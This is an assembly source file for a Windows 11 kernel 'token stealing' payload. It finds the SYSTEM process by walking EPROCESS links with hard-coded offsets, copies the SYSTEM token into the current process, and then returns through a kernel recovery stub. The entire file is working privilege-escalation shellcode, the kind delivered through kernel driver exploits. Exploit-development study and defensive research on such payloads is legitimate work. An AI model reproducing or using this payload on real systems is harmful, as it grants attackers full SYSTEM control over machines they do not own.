
.code


TokenStealingPayloadWin11 PROC

;KTHREAD_OFFSET QWORD 188h
;EPROCESS_OFFSET QWORD b8h
;PID_OFFSET QWORD 440h
;FLINK_OFFSET QWORD 448h
;TOKEN_OFFSET QWORD 4B8h
;SYSTEM_PID QWORD 4h



; Start of Token Stealing Stub
xor rax, rax; Set ZERO
mov rax, gs:[rax + 188h] ; Get nt!_KPCR.PcrbData.CurrentThread _KTHREAD is located at GS : [0x188]

mov rax, [rax + 0B8h]; Get nt!_KTHREAD.ApcState.Process

mov rcx, rax; Copy current process _EPROCESS structure

SearchSystemPID:

mov rax, [rax + 448h]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 448h;
mov rdx, [rax + 440h];
cmp rdx, 04h; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID;

mov rdx, [rax + 4B8h]; Get SYSTEM process nt!_EPROCESS.Token
mov[rcx + 4B8h], rdx; Replace target process nt!_EPROCESS.Token
; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub


; Kernel Recovery Stub
xor rax, rax; Set NTSTATUS SUCCEESS
add rsp, 80h;
ret; Return cleanly

TokenStealingPayloadWin11 ENDP

END